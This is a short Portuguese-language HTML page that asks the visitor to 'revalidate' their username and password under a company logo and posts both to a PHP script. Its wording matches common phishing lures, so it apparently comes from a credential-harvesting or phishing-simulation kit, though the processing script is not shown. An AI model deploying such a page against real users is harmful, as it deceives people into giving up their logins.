<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifique sua senha</title>
    <link rel="stylesheet" href="styles/style.css">
</head>
<body>
    <div class="container">
        <img src="assets/psio-logo.png" alt="Company Logo">
        <h1>Verifique sua senha</h1>
        <p>Por favor, revalide o nome de usuário e senha para continuar.</p>
        <form method="POST" action="scripts/process.php">
            <input type="text" name="username" placeholder="Usuário" required><br>
            <input type="password" name="password" placeholder="Senha" required><br>
            <button type="submit">Continue</button>
        </form>
    </div>

</body>
</html>
